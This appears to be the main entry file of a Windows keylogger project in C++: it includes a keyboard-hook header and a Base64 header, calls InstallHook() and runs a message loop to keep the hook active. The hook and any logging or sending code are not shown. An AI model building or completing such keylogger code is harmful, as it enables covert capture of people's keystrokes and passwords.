#include <iostream>
#include <windows.h>
#include "Base64.h"
#include "KeybHook.h"


int main() {
    MSG msg;
    InstallHook();
    while(GetMessageW(&msg, NULL, 0,0 )){
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }


    //
    return 0;
}
